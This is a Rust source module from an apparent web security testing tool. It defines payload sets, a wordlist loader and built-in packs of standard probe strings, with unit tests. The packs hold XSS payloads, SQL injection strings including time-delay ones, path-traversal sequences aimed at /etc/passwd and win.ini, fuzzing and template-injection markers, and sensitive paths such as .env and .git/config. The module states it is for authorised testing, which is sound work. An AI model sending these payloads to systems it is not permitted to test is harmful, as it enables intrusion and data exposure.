//! Payload sets and a small set of curated built-in packs (plan §8 "Automate"
//! row: "payload sources"; plan §10 "Payload catalog").
//!
//! A [`PayloadSet`] is a named, ordered list of payload strings. Sets come from
//! user wordlists ([`PayloadSet::from_lines`]) or from the small inline
//! [`builtin_pack`]s below.
//!
//! ## Provenance and safety
//!
//! The built-in packs are **short, hand-curated samples of standard, well-known
//! test strings** (classic XSS/SQLi probes, directory-traversal sequences,
//! fuzzing metacharacters, common paths, HTTP methods). They are *not* imported
//! from any third-party corpus, so there is nothing to attribute here; the
//! pinned-manifest import path for SecLists / PayloadsAllTheThings lives
//! elsewhere (plan §10 "Payload source and provenance"). They are provided for
//! **authorized testing only** — assessing systems the operator owns or is
//! permitted to test (plan §2, §10). None of them are exploits; they are inert
//! probe strings that a caller sends, within scope and budget, through the
//! policy-gated request engine.

use serde::{Deserialize, Serialize};

/// A named, ordered list of payloads. Order is preserved exactly (payload order
/// is meaningful for Pitchfork/ClusterBomb attacks, plan §8).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct PayloadSet {
    pub name: String,
    pub payloads: Vec<String>,
}

impl PayloadSet {
    /// Build a set from an explicit list.
    pub fn new(name: impl Into<String>, payloads: Vec<String>) -> Self {
        PayloadSet {
            name: name.into(),
            payloads,
        }
    }

    /// Build a set from raw wordlist text: split on `\n`, trim a trailing `\r`
    /// (so CRLF files load cleanly), and drop blank lines and `#` comment lines.
    /// Whitespace inside a payload is preserved — only the line terminator is
    /// trimmed — so payloads that are themselves spaces/tabs survive.
    pub fn from_lines(name: &str, text: &str) -> Self {
        let payloads = text
            .split('\n')
            .map(|line| line.trim_end_matches('\r'))
            .filter(|line| !line.is_empty() && !line.starts_with('#'))
            .map(|line| line.to_string())
            .collect();
        PayloadSet {
            name: name.to_string(),
            payloads,
        }
    }

    pub fn len(&self) -> usize {
        self.payloads.len()
    }

    pub fn is_empty(&self) -> bool {
        self.payloads.is_empty()
    }
}

/// The names of the built-in packs, in a stable order.
pub fn builtin_packs() -> Vec<&'static str> {
    vec![
        "xss",
        "sqli",
        "traversal",
        "fuzz",
        "common-dirs",
        "http-methods",
    ]
}

/// Resolve a built-in pack by name (case-insensitive). Returns `None` for an
/// unknown name. Every pack is non-empty and modest (well under ~40 entries).
pub fn builtin_pack(name: &str) -> Option<PayloadSet> {
    let canonical = name.to_ascii_lowercase();
    let payloads: Vec<String> = match canonical.as_str() {
        "xss" => strs(&XSS),
        "sqli" => strs(&SQLI),
        "traversal" => strs(&TRAVERSAL),
        "fuzz" => {
            let mut v = strs(&FUZZ);
            // A long run of a single byte, the classic buffer-length probe.
            v.push("A".repeat(256));
            v
        }
        "common-dirs" => strs(&COMMON_DIRS),
        "http-methods" => strs(&HTTP_METHODS),
        _ => return None,
    };
    Some(PayloadSet {
        name: canonical,
        payloads,
    })
}

fn strs(items: &[&str]) -> Vec<String> {
    items.iter().map(|s| s.to_string()).collect()
}

// Classic reflected/stored XSS probes.
const XSS: [&str; 13] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "\"><img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<a href=\"javascript:alert(1)\">x</a>",
    "'\"><svg onload=alert(1)>",
    "<script>alert(document.domain)</script>",
    "<details open ontoggle=alert(1)>",
];

// Classic error- and boolean-based SQL injection probes.
const SQLI: [&str; 13] = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1",
    "') OR ('1'='1",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT NULL--",
    "1' ORDER BY 1--",
    "' AND 1=CONVERT(int,@@version)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)--",
];

// Path-traversal sequences: raw, encoded, double-encoded, and OS targets.
const TRAVERSAL: [&str; 13] = [
    "../",
    "../../",
    "../../../",
    "../../../../etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "C:\\windows\\win.ini",
    "../../../../../../../../etc/passwd%00",
    "..%252f..%252f..%252fetc%252fpasswd",
];

// General-purpose fuzzing metacharacters, format strings, template-injection
// markers, and a null byte. The large-buffer probe is appended at build time.
const FUZZ: [&str; 12] = [
    "`",
    "~",
    "!@#$%^&*()",
    "%s%s%s%s%s",
    "%n%n%n%n",
    "%x%x%x%x",
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "|;&$><`",
    "\0",
    "%00",
];

// Frequently interesting paths for content discovery.
const COMMON_DIRS: [&str; 24] = [
    "admin",
    "administrator",
    "login",
    ".git/",
    ".git/config",
    ".env",
    "backup",
    "backup.zip",
    "api",
    "api/v1",
    "robots.txt",
    "sitemap.xml",
    ".well-known/",
    "config",
    "config.php",
    "wp-admin",
    "phpmyadmin",
    "test",
    "dev",
    ".svn/",
    "server-status",
    ".htaccess",
    "uploads",
    "tmp",
];

// The method matrix (plan §10 "method matrix"). CONNECT is deliberately omitted
// — tunnel methods require separate target-specific opt-in (plan §10).
const HTTP_METHODS: [&str; 8] = [
    "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "HEAD",
];

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn from_lines_splits_and_filters() {
        let text = "a\r\nb\n\n# comment\nc\n";
        let set = PayloadSet::from_lines("w", text);
        assert_eq!(set.payloads, vec!["a", "b", "c"]);
        assert_eq!(set.len(), 3);
        assert!(!set.is_empty());
    }

    #[test]
    fn from_lines_preserves_internal_whitespace() {
        let set = PayloadSet::from_lines("w", "  leading\ntrail  \nmid dle");
        assert_eq!(set.payloads, vec!["  leading", "trail  ", "mid dle"]);
    }

    #[test]
    fn from_lines_drops_comment_and_blank_only_lines() {
        let set = PayloadSet::from_lines("w", "#x\n#y\n\n\n");
        assert!(set.is_empty());
    }

    #[test]
    fn new_keeps_order() {
        let set = PayloadSet::new("x", vec!["z".into(), "a".into(), "m".into()]);
        assert_eq!(set.payloads, vec!["z", "a", "m"]);
    }

    #[test]
    fn builtin_pack_names_all_resolve_and_are_nonempty() {
        for name in builtin_packs() {
            let pack = builtin_pack(name).unwrap_or_else(|| panic!("missing pack {name}"));
            assert!(!pack.is_empty(), "pack {name} is empty");
            assert_eq!(pack.name, name);
            // Each pack is kept modest.
            assert!(pack.len() <= 40, "pack {name} too large: {}", pack.len());
        }
    }

    #[test]
    fn builtin_pack_is_case_insensitive() {
        assert!(builtin_pack("XSS").is_some());
        assert!(builtin_pack("Http-Methods").is_some());
        assert_eq!(builtin_pack("XSS").unwrap().name, "xss");
    }

    #[test]
    fn builtin_pack_unknown_is_none() {
        assert!(builtin_pack("does-not-exist").is_none());
        assert!(builtin_pack("").is_none());
    }

    #[test]
    fn fuzz_pack_includes_large_buffer_probe() {
        let fuzz = builtin_pack("fuzz").unwrap();
        assert!(fuzz
            .payloads
            .iter()
            .any(|p| p.len() >= 256 && p.chars().all(|c| c == 'A')));
    }

    #[test]
    fn http_methods_pack_has_the_matrix_without_connect() {
        let m = builtin_pack("http-methods").unwrap();
        for method in [
            "GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "HEAD",
        ] {
            assert!(m.payloads.iter().any(|p| p == method), "missing {method}");
        }
        assert!(!m.payloads.iter().any(|p| p == "CONNECT"));
    }

    #[test]
    fn traversal_pack_has_passwd_and_windows_targets() {
        let t = builtin_pack("traversal").unwrap();
        assert!(t.payloads.iter().any(|p| p.contains("etc/passwd")));
        assert!(t
            .payloads
            .iter()
            .any(|p| p.to_lowercase().contains("win.ini")));
    }

    #[test]
    fn payload_set_serde_roundtrips() {
        let set = builtin_pack("sqli").unwrap();
        let json = serde_json::to_string(&set).unwrap();
        let back: PayloadSet = serde_json::from_str(&json).unwrap();
        assert_eq!(set, back);
    }
}
